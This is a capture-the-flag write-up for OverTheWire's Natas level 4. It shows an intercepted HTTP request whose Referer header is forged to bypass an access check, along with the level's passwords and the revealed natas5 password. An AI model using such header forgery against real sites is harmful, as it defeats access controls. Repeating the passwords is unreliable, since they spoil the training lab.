# Natas Level 4

> Username: natas4
> Password: JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
> URL: http://natas4.natas.labs.overthewire.org

## Solution

If we try to enter we found: 
`Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`.

Using `Burp Suite` to intercept the request we found:
`Referer: http://natas4.natas.labs.overthewire.org/index.php`

Let's change it to `http://natas5.natas.labs.overthewire.org/` instead.

```txt
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0OkpEclBudVpBS3lsNk1raXFRR0ZJZGRycXB2Z09BU3Ro
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas5.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```text
Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
```

```text
e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
```

